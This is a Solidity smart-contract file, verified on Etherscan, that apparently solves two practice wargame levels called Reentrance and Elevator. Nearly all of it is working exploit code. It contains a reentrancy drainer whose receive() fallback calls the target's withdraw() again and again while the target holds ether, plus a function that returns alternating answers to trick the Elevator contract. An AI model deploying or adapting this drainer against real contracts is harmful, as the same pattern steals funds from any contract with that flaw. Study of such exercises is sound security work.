/**
 *Submitted for verification at Etherscan.io on 2022-02-10
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.6.0 <0.8.0;

interface Reentrance {
  function donate(address to) external payable;

  function balanceOf(address who) external view returns (uint balance);

  function withdraw(uint amount) external;
}

interface Elevator {
  function goTo(uint) external;
}

contract SendBridge {
    address public gaddr;
    bool public top;

    constructor() public {
        top = true;
    }

    function send(address _c) public payable {
        address payable addr = payable(address(_c));
        addr.call.value(msg.value)('');
    }

    function attack(address _addr, uint _amount) public payable {
        gaddr = _addr;
        Reentrance(_addr).withdraw(_amount);
    }

    function up(address _addr) public {
        uint floor;
        floor = 1;
        Elevator(_addr).goTo(floor);
    }
    function isLastFloor(uint _floor) public returns(bool) {
        top = !top;
        return top;
    }

    receive() external payable {
        address _addr = gaddr;
        uint balance = address(_addr).balance;
        if(balance >= 0) {
            Reentrance(_addr).withdraw(balance);
        }
    }

}